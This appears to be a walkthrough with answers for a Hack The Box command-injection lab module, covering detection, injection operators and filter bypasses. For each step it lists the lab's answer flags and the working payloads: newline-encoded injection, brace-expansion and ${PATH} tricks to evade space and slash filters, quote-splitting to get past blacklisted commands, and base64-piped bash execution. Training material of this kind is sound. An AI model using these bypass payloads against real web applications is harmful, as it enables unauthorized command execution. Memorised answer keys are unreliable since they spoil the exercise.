# Detection
1. Try adding any of the injection operators after the ip in IP field. What did the error message say (in English)?
 
 Answer: Please match the requested format

# Injection Commands
1. Review the HTML source code of the page to find where the front-end input validation is happening. On which line number is it?

Answer: 17

Explanation: view-source:http://{IP}

17 <input type="text" name="ip" placeholder="127.0.0.1" pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$"

# Other Injection Operators

1. Try using the remaining three injection operators (new-line, &, |), and see how each works and how the output differs. Which of them only shows the output of the injected command?

Answer: | 
(pipe)

Explanation: ip=127.0.0.1|whoami (ip is the parameter in the request)

# Identifying Filters

1. Try all other injection operators to see if any of them is not blacklisted. Which of (new-line, &, |) is not blacklisted by the web application?

Answer: new-line

Explanation: ip=127.0.0.1%0a (%0a URL encoded of '\n') gives the IP ping response

# Bypassing Space Filters

1. Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?

Answer: 1613

Explanation: ip=127.0.0.1%0a{ls,-la} - bypass by using brace expansion

# Bypassing Other Blaclisted Characters

1.  Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?

Answer: 1nj3c70r

Explanation: Bypass the slash by using the next payload: ip=127.0.0.1%0a{ls,-la,..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}home}

# Bypassing Blacklisted Commands

1. Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.

Answer: HTB{b451c_f1l73r5_w0n7_570p_m3}

Explanation: Bypass the blacklisted command 'cat' by using even umber of quotes or double-quotes. The payload: ip=127.0.0.1%0a{c"at",..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}

# Advanced Command Obfuscation

1. Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1

Answer: /usr/share/mysql/debian_create_root_user.sql

Explanation: Payload: 127.0.0.1%0ab'a'sh<<<$(ba'se6'4${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)

$ echo 'ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=' | base64 --decode find /usr/share/ | grep root | grep mysql | tail -n 1

# Skill Assessment 

Note: Authenticate to 94.237.59.180:56298 with user "guest" and password "guest"

1. What is the content of '/flag.txt'?

Answer: HTB{c0mm4nd3r_1nj3c70r}

Explanation: 1. Login 2. move function 3. /index.php?to=%0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)

Decoder: cat /flag.txt